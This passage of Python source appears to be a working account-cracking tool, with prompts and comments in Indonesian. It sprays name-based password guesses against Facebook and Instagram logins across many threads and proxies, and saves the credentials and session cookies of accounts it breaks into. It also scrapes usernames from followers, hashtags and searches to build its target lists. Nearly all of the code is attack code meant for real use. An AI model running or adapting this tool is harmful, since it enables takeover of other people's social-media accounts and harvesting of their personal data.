refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9'
			}
			po = ses.post(
					'https://'+__tytyd__+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',
					data=dataa,
					cookies={'cookie': koki},
					headers=heade,
					allow_redirects=False,
					proxies=proxs
				)
			if "checkpoint" in po.cookies.get_dict().keys():
				print("\r%s%s %s|%s              %s"%(P,K,idf,pw,P))
				open('Hasil/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Opera/8.01 (J2ME/MIDP; Opera Mini/1.1.5005/hifi/tmobile/at; Nokia 5300; de; U; ssr)"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					#kuki = "sb=" + coki["sb"] + ";" + ("c_user=" + coki["c_user"]) + ";" + ("fr=" + coki["fr"]) + ";" + ("xs=" + coki["xs"])
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r%s%s %s|%s               \n%s%s"%(P,H,idf,pw,kuki,P))     
					open('Hasil/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('Hasil/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print("\r%s%s %s|%s|%s\n%s%s"%(P,HA,idf,pw,kuki,infoakun,P))     
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## INFORMASI TOOLS ##########
def informasi():
	print("\n%s#%s Informasi Tools"%(M,P))
	jalan("%s%s Tools Ini Sedang Dalam Tahap Pengembangan"%(H,P));time.sleep(1)
	jalan("%s%s Jangan Terlalu Berharap Hasil OK Ya "%(H,P));time.sleep(1)
	jalan("%s%s Jangan Lupa Follow Github Gw Cok"%(H,P));time.sleep(1)
	input("\n%s%s Tekan enter untuk kembali "%(M,P));login()
########## PASSWORD TAMBAHAN ##########
def kunaon():
	print("\n%s#%s Crack berjalan"%(M,P))
	print("%s╰───%s Akun %sOK%s : %sHasil/%s"%(H,P,H,P,H,okc))
	print("%s╰───%s Akun %sCP%s : %sHasil/%s\n"%(H,P,K,P,K,cpc))
	with tred(max_workers=30) as pool:
		for AangXD in id2:
			idf,celeng = AangXD.split('|')[0],AangXD.split('|')[1].lower()
			__kiya__ = celeng.split(' ')[0]
			pwv = []
			if len(celeng)<6:
				if len(__kiya__)<3:
					pass
				else:
					pwv.append(__kiya__+'123')
					pwv.append(__kiya__+'1234')
					pwv.append(__kiya__+'12345')
					#pwv.append(__kiya__+'234')
					#pwv.append(__kiya__+'1122')
			else:
				if len(__kiya__)<3:
					pwv.append(celeng)
				else:
					pwv.append(celeng)
					pwv.append(__kiya__+'123')
					pwv.append(__kiya__+'1234')
					pwv.append(__kiya__+'12345')
					#pwv.append(__kiya__+'234')
					#pwv.append(__kiya__+'1122')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	jalan("\n\n\n%s#%s Crack selesai"%(M,P))
	jalan("%s╰───%s Total akun %sOK : %s"%(H,P,H,ok));time.sleep(1)
	jalan("%s╰───%s Total akun %sCP : %s"%(H,P,K,cp));exit()
#--------------------[ BAGIAN-MASUK IG]--------------#
def ___login___():
    os.system('clear')
    ___cookie = input(f"{T}╚═➣{H} MASUKAN COOKIE :{A} ")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{T}╚═➣{M} You will be directed to the creator of this program !!!");sleep(3);os.system('xdg-open https://wa.me/+6282277004825?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');___login___()
    elif ___cookie in ['', ' ']:
        exit(f"{T}[{Z}!{T}]{M} Do not Empty")
    else:
        try:
            ___userid = re.search('ds_user_id=(.?);', ___cookie);open('data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            print(f"{B}[{P}*{B}]{P} {H}Welcome {P}:{K} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{B}[{M}!{B}]{H} Pastikan Cookie Sudah Benar!")
        except (ConnectionError):
            exit(f"{B}[{M}!{B}]{H} Koneksi Error!")
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['user']
        print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{T}║ [{Z}*{T}]{B} Welcome  :{U} {___roz['full_name']}                                                                {T}║")
        print(f"{T}║ [{Z}*{T}]{B} User     :{U} {___roz['username']}                                                              {T}║")
        print(f"{T}║ [{Z}*{T}]{B} Follower :{U} {___roz['follower_count']}                                                                    {T}║")
        print(f"{T}║ [{Z}*{T}]{B} Status   :{H} PREMIUM                                                                 {T}║")
        print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    except (IOError):
        print(f"{T}╚═➣{M} COOKIE INVALID !!!");sleep(3);___login___()
    except (KeyError):
        print(f"{T}╚═➣{M} COOKIE INVALID !!!");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{T}[{J}!{T}]{J} Connection Error")
    print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print(f"{T}║                                           {T}║                                            {T}║")
    print(f"{T}║ {T}[{Z}1{T}]{B} Dump Username From {H}Following          {T}║  {T}[{Z}7{T}]{B} Dump Username From {U}Query              {T}║")
    print(f"{T}║ {T}[{Z}2{T}]{B} Dump Username From {U}Followers          {T}║  {T}[{Z}8{T}]{B} Dump User {U}From Email                  {T}║")
    print(f"{T}║ {T}[{Z}3{T}]{B} Dump Username From {U}Activity           {T}║  {T}[{Z}9{T}]{J} Start Crack {T}[{H}Fast{T}]{H}                    {T}║")
    print(f"{T}║ {T}[{Z}4{T}]{B} Dump Username From {U}Home               {T}║  {T}[{Z}0{T}]{B} List Total {A}Crack                      {T}║")
    print(f"{T}║ {T}[{Z}5{T}]{B} Dump Username From {U}Hashtag            {T}║  {T}[{Z}A{T}]{H} Log out {T}[{M}Exit{T}]{M}                        {T}║")
    print(f"{T}║ {T}[{Z}6{T}]{B} Dump Username From {U}Search             {T}║                                            {T}║")
    print(f"{T}║                                           {T}║                                            {T}║")
    print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    ___pilih = input(f"{T}║ {T}[{A}?{T}]{U} Choose {B}:{J} ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___activity___()
    elif ___pilih in ['4','04']:
        ___beranda___()
    elif ___pilih in ['5','05']:
        ___hastag___()
    elif ___pilih in ['6','06']:
        ___search___()
    elif ___pilih in ['7','07']:
        ___query___()
    elif ___pilih in ['8','08']:
        ___email___()
    elif ___pilih in ['9','09']:
        ___proxy___()
    elif ___pilih in ['0','00']:
        try:
            print(f"{T}║ [{Z}1{T}]{H} Total Ok")
            print(f"{T}║ [{Z}2{T}]{J} Total Cp")
            print(f"{T}║ [{Z}3{T}]{U} Return")
            ___hasil = input(f"{T}║ [{H}?{T}]{B} Choose :{A} ")
            if ___hasil in ['1','01']:
                print(f"{H} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{J} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                print(f"{T}[{M}!{T}]{M} Wrong Input");sleep(2);___menu___()
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{T}[{J}!{T}]{J} Delete Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(2);___login___()
    else:
        print(f"{T}[{M}!{T}]{M} Wrong Input");sleep(2);___menu___()
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"{T}║ [{J}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}║ [{H}✔{T}]{M} Name :{J} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        print(f"{T}[{M}!{T}]{M} Dump Fail");sleep(2);___menu___()
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{M} Connection Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} use Username")
        else:
            ___roz = requests.get(f'https://i.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}[{A}?{T}]{Z} Name :{J} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{M} Connection Error")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://z-p42.www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{T}[{Z}*{T}]{H} Finisehd...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except Exception as e:
        exit(f"{T}[{M}!{T}]{M} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\n{T}[{Z}?{T}]{B} Hashtag :{U} ").replace('#','')
        if ___tag in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        ___file = input(f"{T}[{Z}?{T}]{U} Name File :{B} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get(f'https://z-p42.www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except Exception as e:
        exit(f"{T}[{M}!{T}]{J} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} Use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}[{Z}?{T}]{B} Name :{U} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\n{T}[{Z}?{T}]{B} Query :{U} ")
        if ___query in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___file = ___query.replace(' ','_')+'.txt'
            ___roz = requests.get(f'https://z-p42.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['users']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Dari Email
def ___email___():
    try:
        ___nama = input(f"\n{T}[{Z}?{T}]{B} Name :{U} ").replace(' ','')
        if ___nama in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        ___domain = input(f"{T}[{Z}?{T}]{B} Domain :{U} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{T}[{Z}?{T}]{J} Limit :{A} "))
            if ___limit >=1001:
                exit(f"{T}[{J}!{T}]{M} maximun 1000")
            else:
                print(f"{A} ")
                ___file = 'Dump/'+___nama+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    print(f"{___user}")
                print(f"\n{T}[{Z}*{T}]{H} Finished...")
                print(f"{T}[{Z}?{T}]{B} File Saved in :{U} {___file}")
                input(f"{T}[{J}Return{T}]{A}");___menu___()
        else:
            exit(f"{T}[{J}!{T}]{J} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{T}[{M}!{T}]{M} {e}")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{T}║                                                                                        {T}║")
        print(f"{T}║ [{Z}1{T}]{U} Enter {B}Password {T}[{H}Name, Name123, Name12345{T}]                                          {T}║")
        print(f"{T}║ [{Z}2{T}]{U} Enter {B}Password {T}[{H}name, name123, name1234, name12345{T}]                                {T}║")
        print(f"{T}║ [{Z}3{T}]{U} Enter {B}Password {T}[{M}name, name123, name1234, name12345, name123456{T}]                    {T}║")
        print(f"{T}║ [{Z}4{T}]{U} Enter {B}Password {H}Manual {T}[{M}>5{T}]                                                         {T}║")
        print(f"{T}║                                                                                        {T}║")
        print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
        ___pilih = input(f"{T}║ [{J}?{T}]{J} Choose :{A} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{T}║ [{J}?{T}]{H} Password :{Z} ").split(',')
        try:
            self.___dump = input(f"{T}║ [{J}?{T}]{U} File Dump :{B} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            print(f"{T}║ [{M}!{T}]{M} File Not Found");sleep(2);___menu___()
        try:
            print(f"\n{T}║ [{Z}•{T}]{H} Total Ok Saved Di Results/Ok.txt")
            print(f"{T}║ [{Z}•{T}]{J} Total Cp Saved Di Results/Cp.txt")
            print(f"{T}║ [{Z}•{T}]{A} JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 10 DETIK {M}!!!\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{T}╚═➣ [{H}Finished{T}]{A}")
        except (ValueError):
            exit(f"{T}[{M}!{T}]{M} Crack is complete, there seems to be an error, please re-dump!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
           ___useragent = ("Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
